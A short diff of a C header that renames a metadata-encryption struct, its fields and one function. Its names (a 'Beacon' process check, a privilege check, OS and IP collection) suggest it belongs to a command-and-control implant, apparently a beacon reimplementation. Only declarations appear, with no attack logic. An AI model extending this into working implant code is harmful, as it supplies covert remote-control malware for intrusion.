@@ -13,15 +13,15 @@ typedef struct {
 } MakeMetaInfoResult;
 
 typedef struct {
-    unsigned char* EncryMetadata;
-    DWORD EncryMetadataLen;
-} EncryMetadataResult;
+    unsigned char* EncryptMetaData;
+    DWORD EncryptMetaDataLen;
+} EncryptMetadataResult;
 
 MakeMetaInfoResult MakeMetaInfo();
-EncryMetadataResult EncryMetadata();
+EncryptMetadataResult EncryMetadata();
 BOOL IsHighPriv();
 BOOL IsOSX64();
-BOOL IsProcessX64();
+BOOL IsBeaconProcessX64();
 uint32_t  GetMetaDataFlag();
 unsigned char* GetOSVersion();
 uint32_t GetLocalIPInt();
